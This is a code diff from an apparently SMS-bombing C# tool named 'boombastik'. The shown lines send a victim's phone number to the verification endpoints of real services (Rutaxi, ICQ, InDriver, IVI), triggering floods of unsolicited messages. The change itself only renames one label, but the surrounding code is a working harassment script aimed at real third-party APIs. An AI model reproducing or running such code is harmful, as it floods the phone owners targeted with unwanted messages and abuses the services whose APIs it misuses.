@@ -92,7 +92,7 @@ namespace boombastik
                 Send("https://moscow.rutaxi.ru/ajax_keycode.html", $"l={number}", "Rutaxi");
                 Send("https://www.icq.com/smsreg/requestPhoneValidation.php", $"missdn=+7{ number}&locale=en&countryCode=ru&version=1&k"+ $"=ic1rtwz1s1Hj1O0r&r=46763", "ICQ");
                 Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"mode=request&phone=+7{number}&phone_permission=unknown&stream"+ $"_id=0&v=3&appversion=3.20.6&osversion=unknown&devicemodel=unknown", "InDriver");
-                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{ number}", "IVI");
+                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{ number}", "IVI1");
             }
         }
     }
